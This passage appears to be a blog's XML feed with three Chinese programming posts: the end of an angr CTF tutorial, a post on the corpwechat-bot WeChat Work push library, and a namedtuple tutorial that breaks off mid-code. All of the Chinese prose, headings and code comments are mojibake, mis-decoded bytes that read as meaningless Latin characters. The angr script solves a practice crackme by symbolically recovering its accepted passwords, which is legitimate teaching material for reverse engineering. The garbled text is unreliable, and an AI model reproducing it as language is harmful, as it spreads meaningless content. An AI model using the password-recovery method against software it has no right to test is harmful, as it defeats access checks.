punctuation">.</span>store<span class="token punctuation">(</span>password0_address <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> password2<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> password3<span class="token punctuation">)</span>    <span class="token comment"># åé¢ä¸ä¹‹å‰ä¸€æ ·</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># cast_to=bytes æ˜¯å°†åŸæœ¬8å­—èŠ‚å­˜å‚¨æ•°æ®æŒ‰ç…§bytesæ˜¾ç¤ºï¼Œæœ€ådecodeè½¬æ¢æˆæ™®é€šå­—ç¬¦ä¸²</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution2 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution3 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password3<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">,</span> solution1<span class="token punctuation">,</span> solution2<span class="token punctuation">,</span> solution3<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502150212.png" alt=""></p><h2 id="06-angr"><a href="#06-angr" class="headerlink" title="06_angr"></a>06_angr</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><section class="footnotes"><h2>å‚è€ƒ</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/blob/master/ç¬”è®°/01/Angr_CTFä»å…¥é—¨åˆ°ç²¾é€šï¼ˆä¸€ï¼‰.md">AngrCTF_FITM/Angr_CTFä»å…¥é—¨åˆ°ç²¾é€šï¼ˆä¸€ï¼‰.md at master Â· ZERO-A-ONE/AngrCTF_FITM (github.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>static_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€corpwechat-botã€‘ä¸€ä¸ªå¥½ç”¨çš„ä¼ä¸šå¾®ä¿¡æ¶ˆæ¯æ¨é€pythonæ¥å£åº“</title>
    <link href="/article/22468.html"/>
    <url>/article/22468.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>corpwechat-bot</code>æ˜¯ä¸€ä¸ª<code>python</code>å°è£…çš„ä¼ä¸šæœºå™¨äºº&amp;åº”ç”¨æ¶ˆæ¯æ¨é€åº“ï¼Œé€šè¿‡ä¼ä¸šå¾®ä¿¡æä¾›çš„apiå®ç°ã€‚</p><p>åˆ©ç”¨æœ¬åº“ï¼Œä½ å¯ä»¥è½»æ¾åœ°å®ç°ä»æœåŠ¡å™¨ç«¯å‘é€ä¸€æ¡æ–‡æœ¬ã€å›¾ç‰‡ã€è§†é¢‘ã€<code>markdown</code>ç­‰ç­‰æ¶ˆæ¯åˆ°ä½ çš„å¾®ä¿¡æ‰‹æœºç«¯ï¼Œè€Œä¸ä¾èµ–äºå…¶ä»–çš„ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œå¦‚<code>ServerChan</code>ã€‚</p><h2 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h2><blockquote><p><strong>æ³¨æ„</strong>ï¼Œæœ¬é¡¹ç›®ä¾èµ–äºä¼ä¸šå¾®ä¿¡åˆ›å»ºç¾¤èŠæœºå™¨äººæˆ–åº”ç”¨ï¼Œè¦æƒ³å®ç°éœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªå±äºä½ è‡ªå·±çš„ä¼ä¸šå¾®ä¿¡å·ï¼Œè¿™ååˆ†ç®€ä¾¿ï¼Œå‚ç…§<a href="https://work.weixin.qq.com/">å®˜æ–¹ç½‘å€</a>å³å¯</p></blockquote><p>å½“ä½ æœ‰äº†ä¼ä¸šå¾®ä¿¡åï¼Œä½ è¿˜éœ€è¦åšä¸€äº›é…ç½®ï¼Œæ ¹æ®ä½ è‡ªèº«çš„éœ€æ±‚æ¥åšé€‰æ‹©ï¼š</p><ul><li><strong>åº”ç”¨æ¶ˆæ¯æ¨é€</strong> ï¼šåº”ç”¨æ¶ˆæ¯æ¨é€éœ€è¦åœ¨ä¼ä¸šå¾®ä¿¡ä¸­åˆ›å»ºä¸€ä¸ªç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œ<a href="https://open.work.weixin.qq.com/wwopen/helpguide/detail?t=selfBuildApp">å‚ç…§æ•™ç¨‹</a></li><li><strong>ç¾¤èŠæœºå™¨äººæ¶ˆæ¯æ¨é€</strong>ï¼šç¾¤èŠæœºå™¨äººæ¶ˆæ¯æ¨é€éœ€è¦åœ¨ä½ å·²æœ‰çš„ä¼ä¸šç¾¤ä¸­æ·»åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åè·å–ç›¸åº”çš„æœºå™¨äºº<code>key</code>ï¼Œ<a href="https://jingyan.baidu.com/article/d45ad148cc79eb28552b80b5.html">å‚ç…§æ•™ç¨‹</a></li></ul><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>ä¸‹é¢æ˜¯éƒ¨åˆ†é¡¹ç›®æ¼”ç¤ºæ•ˆæœï¼š</p><ul><li><strong>åº”ç”¨æ¶ˆæ¯æ¨é€</strong><br><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210409154040.png" alt="image-20210409154040566"></li><li><strong>ç¾¤èŠæœºå™¨äººæ¶ˆæ¯æ¨é€</strong><br><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210409154014.png" alt="img_2.png"></li></ul><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><p>ç›®å‰å®ç°äº†ä¸¤ç§æ¨é€æ¶ˆæ¯æ–¹å¼ï¼Œ<strong>åº”ç”¨æ¶ˆæ¯æ¨é€</strong>å’Œ<strong>ç¾¤èŠæœºå™¨äººæ¶ˆæ¯æ¨é€</strong>ï¼Œå…·ä½“æ•ˆæœå‚è€ƒ<a href="docs/usage.md">ä½¿ç”¨æ•™ç¨‹</a></p><ul><li><p><strong>åº”ç”¨æ¶ˆæ¯æ¨é€</strong>ï¼šè¯¥æ¨é€ä¼šç›´æ¥ä¼ è‡³ä½ çš„ä¸ªäººå¾®ä¿¡ä¸Šï¼Œä½ ä¼šåƒæ”¶åˆ°å¥½å‹æ¶ˆæ¯ä¸€æ ·æ”¶åˆ°é€šçŸ¥ä¿¡æ¯ï¼Œ<strong>ä¸éœ€è¦å®‰è£…ä¼ä¸šå¾®ä¿¡</strong>ï¼Œå…·ä½“åŒ…æ‹¬ï¼š</p><div>            <input type="checkbox" disabled checked="checked">æ–‡æœ¬æ¶ˆæ¯: æœ€æ™®é€šçš„æ¶ˆæ¯ï¼Œæ–‡å­—å†…å®¹ï¼Œæœ€é•¿ä¸è¶…è¿‡2048ä¸ªå­—èŠ‚          </div><div>            <input type="checkbox" disabled checked="checked">å›¾ç‰‡æ¶ˆæ¯ï¼šå‘é€ä¸€å¼ å›¾ç‰‡ï¼Œå¯é€‰jpgï¼Œpng          </div><div>            <input type="checkbox" disabled checked="checked">è¯­éŸ³æ¶ˆæ¯ï¼šå‘é€ä¸€æ¡è¯­éŸ³ï¼Œå¤§å°ä¸è¶…è¿‡2MBï¼Œæ—¶é•¿ä¸è¶…è¿‡60sï¼Œå¿…é¡»æ˜¯.amræ ¼å¼          </div><div>            <input type="checkbox" disabled checked="checked">è§†é¢‘æ¶ˆæ¯ï¼šå‘é€ä¸€æ®µè§†é¢‘ï¼Œå¤§å°ä¸è¶…è¿‡10MBï¼Œå¿…é¡»æ˜¯.mp4æ ¼å¼          </div><div>            <input type="checkbox" disabled checked="checked">æ™®é€šæ–‡ä»¶ï¼šå…¶ä»–ç±»å‹çš„æ–‡ä»¶ï¼Œå¤§å°ä¸è¶…è¿‡20MBï¼ˆä¸å°äº5å­—èŠ‚ï¼‰          </div><div>            <input type="checkbox" disabled checked="checked">markdownæ¶ˆæ¯ï¼šä¼ è¾“markdownç±»å‹æ¶ˆæ¯          </div><div>            <input type="checkbox" disabled checked="checked">å›¾æ–‡æ¶ˆæ¯ï¼šå›¾ç‰‡æ–‡å­—å½¢å¼ï¼Œå¸¦æœ‰è·³è½¬é“¾æ¥ï¼Œé€‚åˆåšæ¨å¹¿          </div><div>            <input type="checkbox" disabled checked="checked">æ–‡æœ¬å¡ç‰‡æ¶ˆæ¯ï¼šä»¥å¡ç‰‡å½¢å¼å‘ˆç°çš„æ–‡æœ¬ï¼ŒåŒ…å«è·³è½¬é“¾æ¥          </div><div>            <input type="checkbox" disabled >å°ç¨‹åºé€šçŸ¥æ¶ˆæ¯ï¼šåº”ç”¨éœ€ç»‘å®šå°ç¨‹åºæ‰å¯ä½¿ç”¨ï¼Œå°šæœªå®ç°          </div><div>            <input type="checkbox" disabled >ä»»åŠ¡å¡ç‰‡æ¶ˆæ¯ï¼šå…è®¸ç”¨æˆ·ç‚¹å‡»åšå‡ºç›¸åº”åé¦ˆçš„å¡ç‰‡ï¼Œéœ€ç»‘å®šå›è°ƒå‡½æ•°ï¼Œå°šæœªå®ç°          </div></li></ul><ul><li><p><strong>ç¾¤èŠæœºå™¨äººæ¶ˆæ¯æ¨é€</strong>ï¼šè¯¥æ¨é€ä»…ä¼šå‘é€æ¶ˆæ¯åˆ°ä¼ä¸šå¾®ä¿¡ç¾¤èŠä¸­ï¼Œç»æµ‹è¯•ï¼Œä¸ªäººå¾®ä¿¡çš„ä¼ä¸šç¾¤èŠä¸ä¼šæ”¶åˆ°æœºå™¨äººå‘é€çš„æ¶ˆæ¯ï¼Œå› æ­¤è¦æ”¶åˆ°æ¶ˆæ¯<strong>éœ€å®‰è£…ä¼ä¸šå¾®ä¿¡</strong>ï¼Œå…·ä½“åŒ…æ‹¬ï¼š</p><div>            <input type="checkbox" disabled checked="checked">æ–‡æœ¬æ¶ˆæ¯ï¼šæ™®é€šæ–‡å­—æ¶ˆæ¯ï¼Œæœ€é•¿ä¸è¶…è¿‡2048ä¸ªå­—èŠ‚          </div><div>            <input type="checkbox" disabled checked="checked">å›¾ç‰‡æ¶ˆæ¯ï¼šå›¾ç‰‡å¤§å°ä¸è¶…è¿‡2M          </div><div>            <input type="checkbox" disabled checked="checked">å›¾æ–‡æ¶ˆæ¯ï¼šå›¾ç‰‡æ–‡å­—å½¢å¼ï¼Œå¸¦æœ‰è·³è½¬é“¾æ¥ï¼Œé€‚åˆæ‰“å¹¿å‘Š          </div><div>            <input type="checkbox" disabled checked="checked">æ–‡ä»¶æ¶ˆæ¯ï¼šå‘é€å•ä¸ªæ–‡ä»¶åˆ°ç¾¤èŠï¼Œå¤§å°åœ¨5B~20MBä¹‹é—´          </div></li></ul><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>æœ¬é¡¹ç›®å·²å¼€æºåœ¨githubï¼Œåœ°å€ï¼š<a href="https://github.com/GentleCP/corpwechat-bot">https://github.com/GentleCP/corpwechat-bot</a> , æ›´å¤šä½¿ç”¨æ–¹æ³•å‚è€ƒgithubï¼Œæ¬¢è¿æäº¤PRå’Œstar :)</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>corpwechat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®ç±»åˆ›å»ºä¸ä½¿ç”¨</title>
    <link href="/article/23726.html"/>
    <url>/article/23726.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ç»å¸¸éœ€è¦å¤„ç†ä¸€æ¡åŒ…å«å¤šä¸ªå­—æ®µçš„æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ·ï¼ˆ<code>name</code>, <code>age</code>, <code>sex</code>ï¼‰ï¼Œåœ¨å°†å®ƒä»¬å†™å…¥æ–‡ä»¶æˆ–æ•°æ®åº“ä¹‹å‰ï¼Œä½ ä¼šæ€ä¹ˆå¤„ç†å®ƒä»¬çš„å­˜å‚¨ï¼Ÿæœ€å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘é‡‡ç”¨å…ƒç»„å’Œåˆ—è¡¨ï¼Œä¸åŒç´¢å¼•ä½ç½®çš„å€¼ä»£è¡¨ä¸åŒçš„å­—æ®µï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨ä¸€ä¸ªæ€»çš„åˆ—è¡¨ä¸­ï¼Œåƒä¸‹é¢è¿™æ ·ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">datas <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">'man'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'women'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>ä½†æ˜¯å¾ˆå¿«å‘ç°è¿™æ ·ç»“æ„åŒ–çš„æ•°æ®å¯è¯»æ€§å¹¶ä¸é«˜ï¼Œä¸€æ—¦æ•°æ®å­—æ®µå¾ˆå¤šï¼Œå–å‡ºä¸€æ¡æ•°æ®ä»¥åä½ å¾€å¾€ä¸çŸ¥é“æ¯ä¸ªä½ç½®ä»£è¡¨ä»€ä¹ˆã€‚å› æ­¤ï¼Œæˆ‘æ”¹ç”¨äº†<code>dict</code> ï¼Œæ–°çš„æ•°æ®å¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">datas <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token string">'man'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token string">'women'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>çš„ç¡®æé«˜äº†å¯è¯»æ€§ï¼Œå¹¶ä¸”åœ¨æ•°æ®äº¤ä»˜çš„æ—¶å€™<code>dict</code>ä¸<code>json</code>å¯ä»¥æ— ç¼è¡”æ¥ï¼Œè¿™æ ·ä¼ è¾“æ•°æ®ç»™åˆ«äººä¹Ÿå¾ˆæ–¹ä¾¿ã€‚ä½†æ–°çš„é—®é¢˜åœ¨äºï¼Œ<code>dict</code>è¿™ä¸ªæ•°æ®ç»“æ„æ²¡æœ‰æ˜ç¡®æŒ‡å‡ºæ¥è¿™ä¸ªæ•°æ®æ˜¯ä»€ä¹ˆã€‚ä½ åªçœ‹åˆ°ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>    <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token string">'man'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>ä½†ä»–æ˜¯ä»€ä¹ˆæ•°æ®ç±»å‹å‘¢ï¼Ÿæ¢å¥è¯è¯´ï¼Œå°±æ˜¯ç¼ºå°‘ä¸€ä¸ªæ ‡ç­¾ï¼ŒæŒ‡æ˜è¿™ä¸ªæ•°æ®ï¼Œä¸€æ—¦æˆ‘ä»¬æœ‰å¤šä¸ªæ•°æ®äº¤å‰ä½¿ç”¨ï¼ŒåŒæ—¶éœ€è¦åšç±»å‹éªŒè¯ï¼Œå¦‚ç”¨æˆ·æ•°æ®å’Œå•†å“æ•°æ®åœ¨ä¸€ä¸ªç®¡é“ä¸­ï¼Œåšé‰´åˆ«ç­›é€‰çš„æ—¶å€™ï¼Œ<code>dict</code>å°±æ˜¾å¾—åŠ›ä¸ä»å¿ƒäº†ã€‚ç”±æ­¤ï¼Œæ•°æ®ç±»å°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p><h2 id="namedtuple"><a href="#namedtuple" class="headerlink" title="namedtuple"></a>namedtuple</h2><p>å…‰å¬åå­—å°±çŸ¥é“ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ‰äº†åå­—çš„å…ƒç»„ï¼Œå®ƒå¯ä»¥åŒæ—¶å…¼é¡¾å…ƒç»„å’Œå­—å…¸ä¸¤è€…çš„ç‰¹æ€§ï¼Œå®ç°é«˜æ•ˆçš„æ•°æ®å­˜å‚¨ã€‚</p><h3 id="å®šä¹‰ä¸åˆå§‹åŒ–"><a href="#å®šä¹‰ä¸åˆå§‹åŒ–" class="headerlink" title="å®šä¹‰ä¸åˆå§‹åŒ–"></a><strong>å®šä¹‰ä¸åˆå§‹åŒ–</strong></h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtupleobj <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span>typename<span class="token punctuation">,</span> field_names<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> rename<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><ul><li><strong>typename</strong>ï¼šå…ƒç»„åç§°(å¯ä»¥ç†è§£ä¸ºæ•°æ®ç±»ç±»å)</li><li><strong>field_names</strong>ï¼šå…ƒç»„ä¸­å…ƒç´ ï¼ˆå­—æ®µï¼‰çš„åç§°ï¼Œæœ‰ä¸¤ç§ä¼ å…¥æ–¹å¼<ul><li>ç©ºæ ¼éš”å¼€çš„å­—ç¬¦ä¸²ï¼Œe.g. <code>&quot;name age sex&quot;</code> </li><li>é€—å·éš”å¼€çš„åºåˆ—(<strong>æ¨è</strong>)ï¼Œe.g. <code>[&#39;name&#39;,&#39;age&#39;, &#39;sex&#39;]</code></li></ul></li><li><strong>rename</strong>ï¼šå¦‚æœå…ƒç´ åç§°ä¸­å«æœ‰ python çš„å…³é”®å­—ï¼Œåˆ™å¿…é¡»è®¾ç½®ä¸º rename=True</li><li><strong>verbose</strong>ï¼šé»˜è®¤å°±å¥½</li></ul><h3 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h3><p>ä¸‹é¢çš„ä»£ç ç»™å‡ºäº†<code>namedtuple</code>çš„åŸºç¡€ä½¿ç”¨ï¼ŒåŒæ—¶åœ¨æ¯ä¸€æ­¥æ·»åŠ äº†ç›¸åº”çš„æ³¨é‡Šï¼ˆåŒ…æ‹¬ä½œç”¨å’Œå¥½å¤„ï¼‰ï¼Œå»ºè®®ä»”ç»†é˜…è¯»</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtupleUser <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¿™ä¸€æ­¥ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªUserç±»</span>user <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'man'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>  <span class="token comment"># å®ä¾‹åŒ–å¯¹è±¡</span><span class="token keyword">print</span><span class="token punctuation">(</span> user<span class="token punctuation">.</span>_fields <span class="token punctuation">)</span>  <span class="token comment"># è·å–æ‰€æœ‰å­—æ®µå</span><span class="token comment"># ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªåºåˆ—æ¥åˆ›å»ºä¸€ä¸ªUserå¯¹è±¡ï¼Œé€šè¿‡_makeæ–¹æ³•</span>user <span class="token operator">=</span> User<span class="token punctuation">.</span>_make<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'man'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># è¿™ä¸ªæ¥å£çš„å¥½å¤„åœ¨äºå¯ä»¥æ— ç¼è½¬æ¢åºåˆ—æ•°æ®ï¼Œè¿™æ¯”dictè¦æ–¹ä¾¿</span><span class="token comment"># è·å–ç”¨æˆ·çš„å±æ€§ï¼Œè¿™ç§å±æ€§çš„æ–¹å¼ç›¸æ¯”äº`ditc["name"]`ï¼Œæˆ‘ä¸ªäººæ›´å–œæ¬¢ä¸€äº›</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token comment"># ä¿®æ”¹å¯¹è±¡å±æ€§ï¼Œé€šè¿‡_replaceæ–¹æ³•ï¼Œå¦‚æœä½ éè¦ä¿®æ”¹å­—æ®µå†…å®¹ï¼Œè®°å¾—è¦è¿”å›å€¼ï¼Œnamedtupleæœ¬èº«æ˜¯ä¸å¯å˜çš„ï¼Œè¿™æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„</span>user <span class="token operator">=</span> user<span class="token punctuation">.</span>_replace<span class="token punctuation">(</span>age<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token comment"># å°†Userå¯¹è±¡è½¬æ¢æˆå­—å…¸ï¼Œé€šè¿‡_asdictæ–¹æ³•ï¼Œå®ç°äº†å’Œdictä¹‹é—´çš„æ— ç¼è¡”æ¥</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>_asdict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># æ–°çš„ç‰ˆæœ¬ä¸­å·²ç»æŠŠordereddictå’Œdictåˆå¹¶äº†ï¼Œå› æ­¤ç›´æ¥è¿”å›dict</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li><strong>å¤šæ•°æ®å¤„ç†</strong></li></ul><p>åœ¨å®é™…æƒ…å†µä¸­ï¼Œæˆ‘ä»¬å¾ˆå¯èƒ½æ‹¿åˆ°çš„æ˜¯ä¸€å¤§å †åˆ—è¡¨æ•°æ®ï¼Œç°åœ¨è¦åŸºäº<code>namedtuple</code>è¿›è¡Œè½¬æ¢</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtupleusers <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">,</span><span class="token string">'man'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'women'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span 